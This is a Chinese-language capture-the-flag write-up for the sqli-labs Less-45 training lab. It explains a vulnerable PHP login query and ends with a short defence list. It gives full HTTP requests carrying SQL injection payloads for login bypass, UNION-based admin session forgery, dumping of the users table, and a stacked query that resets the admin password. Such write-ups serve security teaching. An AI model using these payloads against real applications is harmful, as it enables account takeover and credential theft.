## 题目: Sqli‑labs Less‑45

## 题目描述
登录POST表单，结合Less‑43括号闭合与Less‑44无报错特性。`login_user`做转义处理，**注入点为login_password密码位**；使用`mysqli_multi_query()`支持堆叠；关闭SQL报错输出，属于报错盲，但UNION结果依旧可以回显。

## 核心原理
```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
```
关键点：payload 闭合符号为`')`；堆叠不能使用`--‑`，残留括号会造成语法错误，必须使用`#(%23)`注释吃掉剩余 SQL；无报错输出，语法错误页面静默无提示。

**解题思路**
1. Burp 修改 password 参数，`') or 1=1 -- -`完成登录绕过
2. Union 查询伪造 admin 会话身份
3. Union 脱库获取库、表、账号密码数据
4. 堆叠 update 搭配`%23`注释修改 admin 密码，以登录业务验证执行结果

## 解题步骤

### 1. 登录绕过 Burp 包
```
POST /sqli-labs/Less-45/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') or 1=1 -- -&mysubmit=Login
```
跳转`logged‑in.php`，登录身份为 Dumb。

### 2. Union 伪造 admin 身份 Burp 包
```
POST /sqli-labs/Less-45/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') union select 1,'admin',3 -- -&mysubmit=Login
```

Session 用户名被伪造为 admin。

### 3. UNION 脱库 Burp 包
```
POST /sqli-labs/Less-45/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') union select 1,group_concat(username,0x3a,password),3 from users -- -&mysubmit=Login
```
账号密码回显在`YOU ARE LOGGED IN AS`后。

### 4. 堆叠修改 admin 密码 Burp 包（重点使用 %23）
```
POST /sqli-labs/Less-45/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') or 1=1; update users set password='pwned45' where username='admin'%23&mysubmit=Login
```
页面返回 Dumb，后端 admin 密码已修改为`pwned45`。

### 5. 密码修改验证 Burp 包
```
POST /sqli-labs/Less-45/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=pwned45&mysubmit=Login
```
使用新密码成功登录 admin 账号。

## 踩坑记录
1. 闭合必须使用`')`，缺少单引号或右括号直接语法异常，无报错提示。
2. 堆叠注入禁止`--‑`注释，尾部残留括号无法处理，使用`%23`完整注释剩余语句。
3. 关闭数据库报错，语法错误页面静默，依靠登录结果、页面回显判断注入是否生效。
4. `or 1=1`直接登录得到 Dumb 用户，伪造 admin 身份需要使用 UNION。
5. users 表共 3 列，UNION 列数必须严格匹配，列数错误无报错直接失败。
6. 堆叠写操作页面不会展示执行结果，使用业务登录行为验证。

## 知识点总结
- 括号闭合注入：`password=('$password')`，payload 以`')`闭合；对比 42/44 单引号闭合。
- 注释符区别：`#`可以注释本行全部剩余内容，适合处理残留括号场景。
- `mysqli_multi_query()`堆叠注入，分号执行多条 SQL，无需预先登录。
- UNION 控制查询第二列，写入 Session 实现会话伪造。
- 报错盲不等于无回显，优先使用 UNION 获取数据。
- 防御：预编译参数绑定；密码输入同样做转义过滤；关闭多语句查询；生产环境关闭数据库报错输出。
